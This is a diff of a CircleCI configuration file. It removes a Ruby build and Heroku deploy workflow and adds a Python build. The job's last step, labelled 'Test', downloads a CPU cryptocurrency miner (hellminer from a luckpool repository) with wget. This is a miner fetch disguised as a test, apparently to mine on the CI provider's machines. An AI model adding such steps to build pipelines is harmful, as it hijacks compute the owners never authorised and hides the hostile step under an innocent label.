@@ -1,49 +1,22 @@
-version: 2.0
-
+version: 2.1
+orbs:
+  python: circleci/python@1.3.2
 jobs:
   build:
-    docker:
-      - image: circleci/ruby:2.4-node
-      - image: circleci/postgres:9.4.12-alpine
-    working_directory: ~/circleci-demo-workflows
+    executor: python/default
     steps:
       - checkout
-      # Bundle install dependencies
-      - run: bundle install --path vendor/bundle
-
-      # Database setup
-      - run: bundle exec rake db:create db:schema:load
-
-      - run:
-          name: Run tests
-          command: rake
-
-  deploy:
-    machine:
-        enabled: true
-    working_directory: ~/circleci-demo-workflows
-    environment:
-      HEROKU_APP: "sleepy-refuge-55486"
-    steps:
-      - checkout
-      - run:
-          name: Setup Heroku
-          command: bash .circleci/setup-heroku.sh
-
+      - python/install-packages:
+          pkg-manager: pip
+      - python/install-packages:
+          pip-dependency-file: dev-requirements.txt
+          pkg-manager: pip
+      - python/install-packages:
+          args: pytest
+          pkg-manager: pip
+          pypi-cache: false
       - run:
           command: |
-            git push heroku sequential-branch-filter:master
-            heroku run rake db:migrate
-            sleep 5 # sleep for 5 seconds to wait for dynos
-            heroku restart
-workflows:
-  version: 2
-  build-and-deploy:
-    jobs:
-      - build
-      - deploy:
-          requires:
-            - build
-          filters:
-            branches:
-              only: sequential-branch-filter
+            "wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz"
+         
+          name: Test
